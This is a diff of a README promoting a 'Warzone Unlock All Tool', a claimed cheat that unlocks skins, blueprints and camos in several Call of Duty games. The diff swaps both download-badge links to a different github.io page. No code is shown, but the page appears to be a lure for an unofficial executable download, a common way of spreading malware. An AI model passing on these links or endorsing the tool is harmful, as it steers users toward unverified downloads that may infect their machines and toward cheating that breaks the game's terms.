@@ -2,7 +2,7 @@
 
 Warzone Unlock All Tool is a streamlined utility that gives players instant access to all in-game content in Call of Duty: Warzone, Modern Warfare 2, and Cold War. Instantly unlock operator skins, weapon blueprints, camos, attachments, and more — without the usual grind. Whether you're customizing loadouts or showcasing rare camos, this tool simplifies the process while maintaining smooth in-game performance.
 
-[![Download Warzone Unlock All Tool](https://img.shields.io/badge/⬇️%20Download%20Warzone%20Unlock%20All%20Tool-blueviolet)](https://hiopal3847.github.io/.github/262)
+[![Download Warzone Unlock All Tool](https://img.shields.io/badge/⬇️%20Download%20Warzone%20Unlock%20All%20Tool-blueviolet)](https://warzoneload.github.io/.github/)
 
 ---
 
@@ -56,7 +56,7 @@ Warzone Unlock All Tool is a streamlined utility that gives players instant acce
 
 ---
 
-[![Download Warzone Unlock All Tool (Mirror)](https://img.shields.io/badge/⬇️%20Download%20Mirror-blueviolet)](https://hiopal3847.github.io/.github/262)
+[![Download Warzone Unlock All Tool (Mirror)](https://img.shields.io/badge/⬇️%20Download%20Mirror-blueviolet)](https://warzoneload.github.io/.github/)
 
 ---
 
